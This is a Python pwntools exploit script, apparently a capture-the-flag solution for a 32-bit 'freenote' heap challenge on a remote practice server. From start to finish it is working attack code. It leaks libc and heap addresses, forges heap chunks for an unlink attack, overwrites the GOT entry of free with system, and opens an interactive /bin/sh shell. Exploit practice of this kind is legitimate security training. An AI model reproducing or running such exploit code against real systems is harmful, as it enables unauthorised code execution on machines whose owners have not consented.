from pwn import *
context.log_level = "debug"
sh = 0
elf = ELF("freenote_x86")
def showlist():
	sh.recvuntil("Your choice: ")
	sh.sendline("1")
def add(size,content):
	sh.recvuntil("Your choice: ")
	sh.sendline("2")
	sh.recvuntil("Length of new note: ")
	sh.sendline(str(size))
	sh.recvuntil("Enter your note: ")
	sh.send(content)
def free(index):
	sh.recvuntil("Your choice: ")
	sh.sendline("4")
	sh.sendline(str(index))
def edit(index,size,content):
	sh.recvuntil("Your choice: ")
	sh.sendline("3")
	sh.recvuntil("Note number: ")
	sh.sendline(str(index))
	sh.recvuntil("Length of note: ")
	sh.sendline(str(size))
	sh.recvuntil("Enter your note: ")
	sh.send(content)
def pwn(ip,port,debug):
	#bss 804A2EC
	global sh
	offset = 0
	if debug == 1:
		lib = ELF("/lib/i386-linux-gnu/libc.so.6")
		sh = process("./freenote_x86")
	else:
		lib = ELF("libc-2.19.so")
		sh = remote(ip,port)
	add(7,"a"*7)	#idx 0
	add(7,'a'*7)	#idx 1
	free(0)
	add(4,"aaaa")		#idx 2
	showlist()
	sh.recvuntil("0. aaaa")
	libc = u32(sh.recv(4)) - 48 - 0x18 - lib.symbols['__malloc_hook']
	__malloc_hook = libc - 8
	add(7,"b"*7)	#idx 3
	add(7,"c"*7)	#idx 4
	free(0)
	free(2)
	add(4,"aaaa")
	showlist()
	sh.recvuntil("0. aaaa")
	heap_base = (u32(sh.recv(4)) >> 12) << 12
	free(0)
	free(1)
	free(3)
	payload = p32(0x0) + p32(0x81) + p32(heap_base + 0x18 - 12) + p32(heap_base + 0x18 - 8) + p32(0x80)	#chunk0
	payload = payload.ljust(0x80,"6")
	payload += p32(0x80) + p32(0x80)	#chunk1
	payload = payload.ljust(256,"9")
	payload += p32(0x80) + p32(0x81)	#chunk2
	add(len(payload),payload)
	free(1)
	payload = "a"*20
	add(len(payload),payload)
	showlist()
	system_addr = libc + lib.symbols['system']
	binsh_addr = libc + next(lib.search("/bin/sh\x00"))
	add(0x50,0x50*"a")
	payload = "\x250\x00\x00" + p32(1)+p32(0x4) + p32(elf.got['free']) + p32(1) + p32(0x14) + p32(heap_base+0xc280) + p32(1) + p32(0x8) + p32(heap_base + 0xda8) + p32(0) + p32(heap_base + 0xB80) + p32(0)
	payload = payload.ljust(0x108,"\x00")
	edit(0,0x108,payload)
	edit(0,4,p32(system_addr))
	edit(2,8,"/bin/sh\x00")
	showlist()
	free(2)
	log.success("libc: " + hex(libc))
	log.success("heap_base: " + hex(heap_base))	
	log.success("system_addr: " + hex(system_addr))
	log.success("binsh_addr: " + hex(binsh_addr))
	sh.interactive()	
if __name__ == "__main__":
	#nc pwn2.jarvisoj.com 9885	
	pwn("pwn2.jarvisoj.com",9885,0)